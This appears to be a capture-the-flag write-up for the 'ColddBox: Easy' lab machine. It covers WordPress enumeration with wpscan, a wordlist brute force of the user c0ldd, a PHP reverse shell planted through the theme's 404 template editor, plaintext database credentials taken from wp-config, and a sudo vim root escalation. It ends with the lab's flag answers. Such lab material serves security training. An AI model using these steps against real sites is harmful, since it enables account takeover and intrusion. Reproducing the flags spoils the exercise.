# ColddBox: Easy

---

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 64
4512/tcp open  unknown syn-ack ttl 64
```

We see a web service and another open port.

---

## Dirsearch

```bash
dirsearch -u http://cold.thm -e * -t 50
```

```
301 -  /index.php           →  http://cold.thm/
301 -  /index.php/login/    →  http://cold.thm/login/
200 -  /license.txt
200 -  /readme.html
403 -  /server-status
403 -  /server-status/
301 -  /wp-admin            →  http://cold.thm/wp-admin/
200 -  /wp-config.php
500 -  /wp-admin/setup-config.php
302 -  /wp-admin/           →  /wp-login.php?redirect_to=http%3A%2F%2Fcold.thm%2Fwp-admin%2F&reauth=1
200 -  /wp-admin/install.php
200 -  /wp-admin/admin-ajax.php
200 -  /wp-content/
301 -  /wp-content          →  http://cold.thm/wp-content/
200 -  /wp-content/plugins/akismet/akismet.php
500 -  /wp-content/plugins/hello.php
200 -  /wp-content/upgrade/
301 -  /wp-includes         →  http://cold.thm/wp-includes/
500 -  /wp-includes/rss-functions.php
200 -  /wp-login.php
200 -  /wp-cron.php
200 -  /wp-includes/
302 -  /wp-signup.php       →  /wp-login.php?action=register
200 -  /xmlrpc.php
```

Looking shows that WordPress is installed.

<img width="1858" height="972" alt="Screenshot From 2025-09-06 20-39-50" src="https://github.com/user-attachments/assets/2d47117d-7d15-4357-9718-fdee9b4e0bd2" />

---

## Wpscan

```bash
wpscan --url http://cold.thm/ -e u
```

Output shows 4 users:

```
[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```
---

## Bruteforce

```bash
wpscan --url http://cold.thm/ \
  --usernames c0ldd \
  --passwords /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

We found valid credentials:

```
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

Logged in successfully.

<img width="1858" height="972" alt="Screenshot From 2025-09-06 21-40-23" src="https://github.com/user-attachments/assets/312e9304-69d1-4edd-a79c-080b84e757e6" />

---

## Reverse Shell via 404 Template

Uploaded a PHP reverse shell through **Appearance → Editor → 404 Template**.

Source:
[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

<img width="1858" height="972" alt="Screenshot From 2025-09-06 21-41-09" src="https://github.com/user-attachments/assets/c3d772d0-661a-42be-8e48-7298aef0211e" />

To trigger the 404 page, I clicked on the first blog titled “The Colddbox is here” and changed the parameter `p=` in the URL to a random number.

<img width="1858" height="972" alt="Screenshot From 2025-09-06 21-47-46" src="https://github.com/user-attachments/assets/b65d4ee7-9581-45f0-84f3-41970b219ef6" />

Got a shell back.

---

## MySQL Credentials

You know that there’s a WordPress site running. 
Go the `/var/www/html` and have look at the files. 
Check through those which you feel will contain some important information. 
There is a file which has credentials in plain text.

```php
/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');
```

Logged into MySQL:

```bash
mysql -u c0ldd -p
# Password: cybersecurity
```

Switching to `c0ldd` with password `cybersecurity` gave the first flag:

```
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

---

## Privilege Escalation

Checking sudo:

```bash
sudo -l
```

```
Matching Defaults entries for c0ldd on ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User c0ldd may run the following commands on ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

Since vim can be run as root, I executed:

```bash
sudo vim /root/root.txt
```

Root flag:

```
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

---

## Flags

> Q1: User flag
> A1: RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

> Q2: Root flag
> A2: wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
